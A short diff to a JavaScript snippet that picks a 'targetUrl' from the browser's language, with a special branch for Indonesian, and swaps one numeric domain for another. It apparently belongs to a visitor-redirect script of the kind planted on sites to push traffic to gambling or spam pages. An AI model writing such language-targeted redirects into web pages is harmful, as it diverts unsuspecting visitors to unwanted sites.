@@ -9,7 +9,7 @@
         ? navigator.languages 
         : [navigator.language || navigator.userLanguage || ''];
     
-    var targetUrl = 'https://168060.com';
+    var targetUrl = 'https://588985.com';
 
     for (var i = 0; i < langs.length; i++) {
         var low = (langs[i] || '').toLowerCase();
@@ -18,7 +18,7 @@
             break;
         }
         if (low.indexOf('id') === 0) {
-            targetUrl = 'https://168060.com';
+            targetUrl = 'https://588985.com';
             break;
         }
     }
